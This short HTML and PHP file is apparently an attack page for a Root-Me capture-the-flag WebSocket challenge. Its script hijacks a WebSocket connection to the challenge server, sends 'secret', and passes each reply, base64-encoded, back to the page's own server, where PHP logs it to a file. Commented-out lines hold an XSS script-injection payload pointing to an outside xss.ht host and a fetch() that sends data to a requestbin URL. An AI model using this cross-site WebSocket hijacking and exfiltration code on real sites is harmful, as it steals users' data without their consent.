	  <meta charset="utf-8" />
	  <title>Testing</title>
	  <script language="javascript" type="text/javascript">

	  var url = "ws://challenge01.root-me.org:58036/ws";

    websocket = new WebSocket(url)
    websocket.onopen = start
    websocket.onmessage = handleReply
    function start(event)
    {
	websocket.send('secret');
	  var xhttp = new XMLHttpRequest();
	xhttp.open("GET", "/?m=MESSAGE_SENT", true);
	xhttp.send();
        //websocket.send('<><><script src=https://pepecomacaxss.xss.ht>');
    }

    function handleReply(event)
    {
	var xhttp = new XMLHttpRequest();
	xhttp.open("GET", "/?m=" + btoa(event.data), true);
	xhttp.send();
      //fetch('http://requestbin.net/r/34y37frp?'+event.data, {mode: 'no-cors'});
    }
		  
	  </script>

	  <h2>WebSocket Payload</h2>

	  <div id="output"></div>
<?php
file_put_contents("log.txt", $_GET["m"]."\r\n");

?>
